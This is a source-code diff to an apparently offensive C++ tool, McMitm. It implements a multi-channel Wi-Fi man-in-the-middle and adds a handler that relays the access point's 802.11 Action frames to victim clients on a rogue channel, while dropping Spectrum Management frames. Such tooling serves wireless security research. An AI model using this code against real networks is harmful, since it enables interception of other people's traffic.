@@ -102,33 +102,59 @@ void McMitm::handle_auth_from_client_real(const Dot11Authentication &auth) {
     add_client(std::move(client));
 }
 
-void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu){
+bool McMitm::handle_action_real(PDU &pdu, const Dot11 &dot11) const{
+    if(dot11.type() != Dot11::MANAGEMENT || dot11.subtype() != 13) return false;
+
+    if(dot11.wep()){
+        const HWAddress<6> src = const_cast<Dot11&>(dot11).serialize().size() >= 16
+            ? HWAddress<6>(const_cast<Dot11&>(dot11).serialize().data() + 10)
+            : HWAddress<6>();
+        if(src == ap_mac){
+            log(LogLevel::DEBUG, "Real channel: encrypted Action -> rogue channel");
+            sock_rogue->send(pdu, netconfig.rogue_channel);
+        }
+        return true;
+    }
+
+    const auto raw = const_cast<Dot11&>(dot11).serialize();
+    if(raw.size() < 25) return false;
+    const uint8_t category = raw[24];
+
+    if(category == 0){
+        log(LogLevel::DEBUG, "Dropping Action frame category=0 (Spectrum Management)");
+        return true;
+    }
+
+    const HWAddress<6> src(raw.data() + 10);
+    const HWAddress<6> dst(raw.data() + 4);
+
+    if(src == ap_mac && clients.contains(dst.to_string())){
+        log(LogLevel::DEBUG, "Real channel: Action(cat={}) → rogue channel", category);
+        sock_rogue->send(pdu, netconfig.rogue_channel);
+        return true;
+    }
+    return false;
+}
+
+void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_t> &raw){
     Dot11 *dot11 = pdu->find_pdu<Dot11>();
     if(!dot11) return;
-
-    const HWAddress<6> addr1 = dot11->addr1();
-    HWAddress<6> addr2;
-    if(const auto *mgmt = pdu->find_pdu<Dot11ManagementFrame>()){
-        addr2 = mgmt->addr2();
-    }else if(const auto *data = pdu->find_pdu<Dot11Data>()){
-        addr2 = data->addr2();
-    }else if(dot11->type() == Dot11::MANAGEMENT){
-        const auto raw = dot11->serialize();
-        if(raw.size() >= 16)
-            addr2 = HWAddress<6>(raw.data() + 10).to_string();
-    }else{
-        log(LogLevel::WARNING, "Unknown frame type");
+    const auto [addr1, addr2] = get_addrs(*pdu, raw);
+    if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL){
+        log(LogLevel::DEBUG, "Unknown frame type");
         return;
     }
 
 
     if (handle_probe_real(addr2, *dot11)) return;
+    if(handle_action_real(*pdu, *dot11)) return;
     //if(handle_eapol(addr2, addr1, *dot11)) return;
 
-    if(dot11->addr1() == ap_mac){ // STA -> AP
-        if(const auto *auth = dot11->find_pdu<Dot11Authentication>())
+    if(dot11->addr1() == ap_mac){
+        // STA -> AP
+        if(const auto *auth = dot11->find_pdu<Dot11Authentication>()){
             handle_auth_from_client_real(*auth);
-        else if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()){
+        }else if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()){
             print_rx(LogLevel::INFO, "Real channel", *dot11);
             del_client(addr2.to_string());
         } else if(clients.contains(addr2.to_string())){
@@ -138,7 +164,7 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu){
         }
 
         // Sleep mode detection
-        if(power_mgmt(*dot11) && clients.contains(addr2.to_string())){
+        if(dot11->power_mgmt() && clients.contains(addr2.to_string())){
             const auto &client = clients.at(addr2.to_string());
             if(client->state < ClientState::Attack_Done){
                 log(LogLevel::WARNING, "Client {} is going to sleep on real channel.", addr2.to_string());
